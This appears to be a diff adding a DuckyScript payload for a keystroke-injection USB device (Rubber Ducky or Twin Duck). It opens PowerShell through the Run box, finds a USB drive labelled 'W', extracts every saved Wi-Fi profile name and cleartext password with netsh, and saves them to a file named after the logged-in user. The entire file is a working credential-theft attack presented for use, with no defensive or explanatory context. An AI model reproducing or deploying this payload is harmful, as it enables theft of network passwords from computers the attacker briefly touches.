@@ -1,0 +1,25 @@
+REM Exfiltrate wifi passwords to usb [or twinduck]
+REM Created By : Blue Cosmo
+
+REM let computer recognize twinduck
+DELAY 1000
+
+REM open powershell via runbox
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 200
+
+REM cd into drive labeled "W"
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'W'}|select name;cd $u.name
+ENTER
+DELAY 100
+
+REM exfiltrate wifi passwords to file
+REM file named after computer username
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >$env:UserName".txt"
+ENTER
+DELAY 300
+STRING exit
+ENTER
